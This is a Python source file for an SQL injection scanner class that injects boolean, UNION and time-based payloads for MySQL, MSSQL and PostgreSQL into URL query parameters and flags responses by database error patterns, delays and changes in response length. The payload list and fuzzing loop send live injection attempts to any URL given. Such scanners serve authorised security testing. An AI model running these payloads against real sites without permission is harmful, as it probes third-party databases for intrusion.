import requests
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


class SQLiTester:
    """
    Advanced tester for SQL Injection vulnerabilities.
    Covers boolean-based, error-based, union-based, and time-based vectors.
    """

    def __init__(self, session=None):
        self.session = session or requests.Session()
        self.vulnerable = []

    def sqli_payloads(self):
        """
        Returns a diverse payload list covering multiple injection techniques.
        """
        return [
            "' OR '1'='1' -- ",
            "' AND '1'='2' -- ",
            "\" OR \"1\"=\"1\" -- ",
            "' UNION SELECT NULL-- ",
            "' UNION SELECT NULL,NULL-- ",
            "'; WAITFOR DELAY '0:0:5'--",  # MSSQL time-based
            "' OR SLEEP(5)--",             # MySQL time-based
            "' AND SLEEP(5)--",
            "'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",  # PostgreSQL
        ]

    def detect_db_errors(self, response_text):
        """
        Detect common DBMS error messages.
        """
        db_errors = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"Unclosed quotation mark after the character string",
            r"Microsoft OLE DB Provider for SQL Server",
            r"PostgreSQL.*ERROR",
            r"supplied argument is not a valid MySQL",
            r"SQLite/JDBCDriver",
            r"ORA-\d{5}",  # Oracle errors
        ]
        for pattern in db_errors:
            if re.search(pattern, response_text, re.I):
                return pattern
        return None

    def test_url(self, parsed, query_params):
        """
        Fuzz query params with multiple SQLi payloads.
        Uses error, time, and boolean-based detection.
        """
        # Baseline request
        baseline_resp = self.session.get(urlunparse(parsed), timeout=10)
        baseline_len = len(baseline_resp.text)

        for param in query_params:
            for payload in self.sqli_payloads():
                test_params = parse_qs(parsed.query)
                test_params[param] = payload
                new_query = urlencode(test_params, doseq=True)
                new_url = urlunparse(parsed._replace(query=new_query))

                try:
                    resp = self.session.get(new_url, timeout=15)
                    elapsed = resp.elapsed.total_seconds()
                    content_len = len(resp.text)

                    # Detect error-based
                    db_error = self.detect_db_errors(resp.text)
                    if db_error:
                        vuln = {
                            "url": new_url,
                            "param": param,
                            "vuln_type": "SQL Injection (Error-Based)",
                            "severity": "Critical",
                            "evidence": f"Matched DB error: {db_error}"
                        }
                        self.vulnerable.append(vuln)
                        print(f"[+] Possible SQL Injection (error-based): {new_url}")

                    # Detect time-based blind
                    elif elapsed > 5 and any("sleep" in payload.lower() or "delay" in payload.lower() for payload in [payload]):
                        vuln = {
                            "url": new_url,
                            "param": param,
                            "vuln_type": "Blind SQL Injection (Time-Based)",
                            "severity": "Critical",
                            "evidence": f"Response delay: {elapsed:.2f}s"
                        }
                        self.vulnerable.append(vuln)
                        print(f"[+] Possible Blind SQL Injection (time-based): {new_url}")

                    # Detect boolean-based blind
                    elif abs(baseline_len - content_len) > 50:
                        vuln = {
                            "url": new_url,
                            "param": param,
                            "vuln_type": "Blind SQL Injection (Boolean-Based)",
                            "severity": "Critical",
                            "evidence": f"Baseline length: {baseline_len}, Test length: {content_len}"
                        }
                        self.vulnerable.append(vuln)
                        print(f"[+] Possible Blind SQL Injection (boolean-based): {new_url}")

                except requests.RequestException as e:
                    print(f"[!] Request failed for {new_url}: {e}")

    def run(self, url_list):
        """
        Run SQLi tests on all URLs with query params.
        """
        for url in url_list:
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)
            if query_params:
                self.test_url(parsed, query_params)
        return self.vulnerable
